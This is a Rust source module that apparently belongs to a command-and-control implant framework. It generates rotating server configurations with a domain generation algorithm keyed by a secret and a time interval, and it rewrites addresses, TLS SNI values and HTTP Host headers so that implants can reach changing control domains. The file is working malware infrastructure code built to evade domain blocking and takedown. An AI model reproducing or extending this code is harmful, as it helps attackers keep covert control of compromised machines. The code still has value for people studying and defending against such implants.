use super::{DgaAlgorithm, DgaDomain, DgaError};
use crate::config::ServerConfig;
use malefic_helper::debug;

#[cfg_attr(debug_assertions, derive(Debug))]
pub struct DgaGenerator {
    algorithm: DgaAlgorithm,
    template_configs: Vec<ServerConfig>,
}

impl DgaGenerator {
    pub fn from_server_configs(
        server_configs: Vec<ServerConfig>,
    ) -> Result<Self, DgaError> {
        if server_configs.is_empty() {
            return Err(DgaError::NoDomains);
        }

        let dga_key = crate::config::DGA_KEY.clone();
        let interval_hours = crate::config::DGA_INTERVAL_HOURS.clone();

        let domains: Vec<String> = server_configs.iter()
            .filter_map(|config| config.get_domain_suffix().map(|s| s.clone()))
            .collect();

        if domains.is_empty() {
            return Err(DgaError::NoDomains);
        }

        debug!("[dga] Using domain suffixes from server configs: {:?}", domains);

        let algorithm = DgaAlgorithm::new(dga_key, interval_hours, domains);

        Ok(Self {
            algorithm,
            template_configs: server_configs,
        })
    }

    pub fn generate_new_server(&self) -> Vec<ServerConfig> {
        let dgas = self.algorithm.generate();
        let mut server_configs = Vec::new();
        // 生成server_configs
        for dga in dgas {
            let template = self.find_template_for_domain(&dga.suffix).unwrap();
            let config = self.create_server_config(&dga, template);
            server_configs.push(config);
        }
        
        server_configs
    }

    fn find_template_for_domain(&self, suffix: &str) -> Option<&ServerConfig> {
        self.template_configs.iter().find(|config| {
            config.get_domain_suffix()
                .map(|s| s == suffix)
                .unwrap_or(false)
        })
    }

    fn create_server_config(&self, domain: &DgaDomain, template: &ServerConfig) -> ServerConfig {
        let mut config = template.clone();
        
        let port = if let Some(colon_pos) = template.address.rfind(':') {
            &template.address[colon_pos..]
        } else {
            ":443"
        };

        config.address = format!("{}{}", domain.domain, port);
        
        if let Some(ref mut tls_config) = config.tls_config {
            let should_update_sni = tls_config.sni.is_empty() ||
                                   tls_config.sni == domain.suffix ||
                                   tls_config.sni == template.address.split(':').next().unwrap_or("");
            
            if should_update_sni {
                tls_config.sni = domain.domain.clone();
                debug!("[dga] Updated SNI: {} -> {}", 
                       template.address, tls_config.sni);
            } else {
                debug!("[dga] Keeping custom SNI: {}", tls_config.sni);
            }
        }

        if let crate::config::TransportConfig::Http(ref mut http_config) = config.transport_config {
            http_config.headers.insert("Host".to_string(), domain.domain.clone());
            debug!("[dga] Updated HTTP Host header: {}", domain.domain);
        }
        
        debug!("[dga] Created config: {} -> {} (SNI: {}, time window: {})", 
               template.address, 
               config.address,
               config.tls_config.as_ref().map(|t| &t.sni).unwrap_or(&"none".to_string()),
               domain.seed);
        
        config
    }

}
